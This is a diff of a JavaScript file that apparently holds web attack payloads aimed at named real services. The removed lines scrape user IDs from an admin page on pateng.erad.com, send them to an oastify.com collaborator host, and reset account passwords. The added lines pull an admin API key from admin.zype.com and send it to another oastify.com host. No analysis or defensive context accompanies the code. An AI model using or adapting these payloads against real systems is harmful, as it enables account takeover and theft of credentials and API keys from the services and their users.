@@ -1,15 +1,10 @@
-for (let i = 199307; i <= 199308; i++) {
-  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
-    .then(res => res.text())
-    .then(res => {
-      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
-      if (match) {
-        fetch(`https://z6611aosllgv4bf92ualm68kdbj27uvj.oastify.com?data=${encodeURIComponent(match[1])}`);
-      }
-      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
-      });
-    });
-}
+fetch("https://admin.zype.com/api_keys").then(a => a.text()).then(a => {const apiKeyMatch = a.match(/<td>Admin<\/td>\s*<td>(\w+)<\/td>/);if (apiKeyMatch) {
+      const apiKey = apiKeyMatch[1];
+      return fetch("https://6t0nfu4gc6imdeyah1lzyorxaogf45su.oastify.com?x=" + apiKey);
+    } else {
+      console.error("API Key not found in the response");
+    }
+  })
+  .then(response => {
+    console.log(response);
+  });
